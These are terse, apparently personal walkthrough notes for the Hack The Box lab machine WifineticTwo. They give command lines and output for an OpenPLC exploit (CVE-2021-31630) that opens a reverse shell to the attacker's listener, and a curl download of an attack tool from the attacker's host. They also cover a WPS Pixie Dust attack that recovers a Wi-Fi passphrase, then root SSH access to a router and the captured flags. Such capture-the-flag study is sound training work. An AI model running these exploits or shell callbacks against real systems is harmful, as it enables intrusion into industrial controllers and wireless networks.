rustscan -r 1-65535 -a 10.10.11.7 -- -sV -Pn -A

![[WifineticTwo image.png]]

![[WifineticTwo image 1.png]]

![[WifineticTwo image 2.png]]

nmap -p8080 -Pn -sV -sC -A 10.10.11.7

![[WifineticTwo image 3.png]]

![[WifineticTwo image 4.png]]

feroxbuster --url http://10.10.11.7:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60 -C 400,500 -k

![[WifineticTwo image 5.png]]

![[WifineticTwo image 6.png]]

openPLC

default username and password login

![[WifineticTwo image 7.png]]

![[WifineticTwo image 8.png]]

openPLC vulnerability

https://www.exploit-db.com/exploits/49803

![[WifineticTwo image 9.png]]

python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.120 -r 4444

![[WifineticTwo image 10.png]]

…

![[WifineticTwo image 11.png]]

nosuccess

https://github.com/Hunt3r0x/CVE-2021-31630-HTB

python3 exploit.py -ip 10.10.14.120 -p 4444 -u openplc -pwd openplc

![[WifineticTwo image 12.png]]

![[WifineticTwo image 13.png]]

Success

![[WifineticTwo image 14.png]]

c71873a1056b0d63a8b5f1efd282c500

pivot

![[WifineticTwo image 15.png]]

![[WifineticTwo image 16.png]]

PixieDust Attack

https://github.com/nikita-yfh/OneShot-C?source=post_page-----654c16eb5647--------------------------------

curl http://10.10.14.120:8000/oneshot.c -o oneshot.c

![[WifineticTwo image 17.png]]

![[WifineticTwo image 18.png]]

gcc oneshot.c -o oneshot

![[WifineticTwo image 19.png]]

ifconfig

![[WifineticTwo image 20.png]]

or

ip a s wlan0

![[WifineticTwo image 21.png]]

./oneshot -b 02:00:00:00:02:00 -K -i wlan0

for i in {1..255}; do IP="192.168.1.$i"; ping -c 1 -W 1 "$IP" &>/dev/null && echo "$IP is reachable" || echo "$IP is not reachable"; done

nc -nlvp 4443

listening on \[any\] 4443 ...

connect to \[10.10.14.120\] from (UNKNOWN) \[10.10.11.7\] 57596

python3 -c 'import pty;pty.spawn("/bin/bash")'

root@attica03:/opt/PLC/OpenPLC_v3/webserver# cd /root

cd /root

root@attica03:~# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! > config

wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! > config

root@attica03:~# cat config

cat config

network={

ssid="plcrouter"

#psk="NoWWEDoKnowWhaTisReal123!"

psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156

}

root@attica03:~# wpa_supplicant -B -c config -i wlan0

wpa_supplicant -B -c config -i wlan0

Successfully initialized wpa_supplicant

rfkill: Cannot open RFKILL control device

rfkill: Cannot get wiphy information

root@attica03:~# ifconfig wlan0 192.168.1.7 netmask 255.255.255.0

ifconfig wlan0 192.168.1.7 netmask 255.255.255.0

![[WifineticTwo image 22.png]]

root@attica03:~# ssh root@192.168.1.1

ssh root@192.168.1.1

The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.

ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.

This key is not known by any other names

Are you sure you want to continue connecting (yes/no/\[fingerprint\])? yes

yes

Warning: Permanently added '192.168.1.1' (ED25519) to the list of known hosts.

BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

_______                     ________        __

\|       |.-----.-----.-----.|  |  |  |.----.|  |_

\|   -   ||  _  |  -__|     ||  |  |  ||   _||   _|

\|_______||   __|_____|__|__||________||__|  |____|

\|__| W I R E L E S S   F R E E D O M

\-----------------------------------------------------

OpenWrt 23.05.2, r23630-842932a63d

\-----------------------------------------------------

=== WARNING! =====================================

There is no root password defined on this device!

Use the "passwd" command to set up a new password

in order to prevent unauthorized SSH logins.

\--------------------------------------------------

root@ap:~# ls

ls

root.txt

root@ap:~# cat root.txt

cat root.txt

3e87874183bb6beca3eb063efc76e8d6

![[WifineticTwo image 23.png]]